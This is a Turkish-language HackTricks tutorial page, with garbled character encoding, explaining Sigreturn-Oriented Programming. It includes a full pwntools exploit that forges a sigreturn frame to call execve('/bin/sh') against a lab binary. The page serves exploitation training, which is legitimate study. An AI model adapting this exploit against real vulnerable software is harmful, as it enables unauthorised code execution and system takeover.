# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

**`Sigreturn`**, bir sinyal iÅŸleyicisinin yÃ¼rÃ¼tmesini tamamladÄ±ktan sonra temizlemek iÃ§in kullanÄ±lan Ã¶zel bir **syscall**'dÄ±r. Sinyaller, iÅŸletim sistemi tarafÄ±ndan bir programa gÃ¶nderilen kesintilerdir ve genellikle olaÄŸanÃ¼stÃ¼ bir durumun meydana geldiÄŸini belirtmek iÃ§in kullanÄ±lÄ±r. Bir program bir sinyal aldÄ±ÄŸÄ±nda, sinyali iÅŸlemek iÃ§in geÃ§ici olarak mevcut iÅŸini durdurur ve bu iÅŸlem iÃ§in Ã¶zel olarak tasarlanmÄ±ÅŸ bir **sinyal iÅŸleyici** kullanÄ±r.

Sinyal iÅŸleyici tamamlandÄ±ktan sonra, programÄ±n **Ã¶nceki durumuna geri dÃ¶nmesi** gerekir, sanki hiÃ§bir ÅŸey olmamÄ±ÅŸ gibi. Ä°ÅŸte bu noktada **`sigreturn`** devreye girer. ProgramÄ±n **sinyal iÅŸleyicisinden geri dÃ¶nmesine** yardÄ±mcÄ± olur ve sinyal iÅŸleyici tarafÄ±ndan kullanÄ±lan yÄ±ÄŸÄ±n Ã§erÃ§evesini (fonksiyon Ã§aÄŸrÄ±larÄ±nÄ± ve yerel deÄŸiÅŸkenleri depolayan bellek bÃ¶lÃ¼mÃ¼) temizleyerek programÄ±n durumunu geri yÃ¼kler.

Ä°lginÃ§ olan, **`sigreturn`**'Ä±n programÄ±n durumunu nasÄ±l geri yÃ¼klediÄŸidir: **tÃ¼m CPU'nun kayÄ±t deÄŸerlerini yÄ±ÄŸÄ±nda saklayarak** bunu yapar. Sinyal artÄ±k engellenmediÄŸinde, **`sigreturn` bu deÄŸerleri yÄ±ÄŸÄ±ndan Ã§Ä±karÄ±r**, bÃ¶ylece CPU'nun kayÄ±tlarÄ±nÄ± sinyal iÅŸlenmeden Ã¶nceki durumuna sÄ±fÄ±rlar. Bu, yÄ±ÄŸÄ±nÄ±n mevcut Ã¼st kÄ±smÄ±nÄ± gÃ¶steren yÄ±ÄŸÄ±n iÅŸaretÃ§isi kaydÄ± (RSP) dahil olmak Ã¼zere tÃ¼m kayÄ±tlarÄ± iÃ§erir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** syscall'Ä±nÄ± Ã§aÄŸÄ±rarak ve **yÃ¼klemek istediÄŸimiz kayÄ±t deÄŸerlerini** **yÄ±ÄŸÄ±na** ekleyerek, tÃ¼m kayÄ±t deÄŸerlerini **kontrol etmek** ve dolayÄ±sÄ±yla Ã¶rneÄŸin `execve` syscall'Ä±nÄ± `/bin/sh` ile **Ã§aÄŸÄ±rmak** mÃ¼mkÃ¼ndÃ¼r.
{% endhint %}

Bu durumun, diÄŸer Ret2syscall'larÄ± Ã§aÄŸÄ±rmak iÃ§in parametreleri kontrol etmeyi Ã§ok daha kolay hale getiren bir **Ret2syscall tÃ¼rÃ¼** olduÄŸunu unutmayÄ±n:

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

Daha iyi bir aÃ§Ä±klama iÃ§in ayrÄ±ca kontrol edin:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Ã–rnek

[**Burada bir Ã¶rnek bulabilirsiniz**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), ancak buradan son exploit budur:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
